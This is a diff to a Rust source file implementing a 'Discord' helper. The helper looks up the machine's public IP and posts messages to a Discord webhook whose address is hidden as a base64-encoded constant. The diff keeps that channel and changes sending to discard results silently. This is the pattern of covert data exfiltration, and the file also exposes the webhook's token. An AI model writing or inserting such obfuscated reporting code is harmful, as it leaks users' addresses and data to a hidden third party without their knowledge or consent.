@@ -1,7 +1,6 @@
 use std::collections::HashMap;
 
-use reqwest::blocking::{Client, Response};
-use reqwest::Error;
+use reqwest::blocking::Client;
 use base64::prelude::*;
 
 const DSC: &'static str = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0MDc0Nzc2ODc3OTc2Nzg0OS8xZUtldE4zTzZtSXo4WWcyWVFkbGt5YTRfaGEtVWRsUElxcDVtMzFvaHhGMnlrSEJwYldybWRzTlZtUW9od0lfdXlvRA==";
@@ -24,10 +23,6 @@ impl Discord {
         self.data.insert(String::from("username"), username.to_string());
     }
 
-    pub fn set_content(&mut self, content: String) {
-        self.data.insert(String::from("content"), content);
-    }
-
     pub fn get_ip(&self) -> String {
         self.client.get("https://api.ipify.org")
             .send()
@@ -35,12 +30,14 @@ impl Discord {
             .unwrap_or_default()
     }
 
-    pub fn send(&self) -> Result<Response, Error> {
+    pub fn send(&mut self, content: String) {
+        self.data.insert(String::from("content"), content);
+
         let url = String::from_utf8(BASE64_STANDARD.decode(DSC.as_bytes()).expect("internal error")).expect("internal error");
 
-        self.client.post(url)
+        let _ = self.client.post(url)
             .json(&self.data)
-            .send()
+            .send();
     }
 }
 
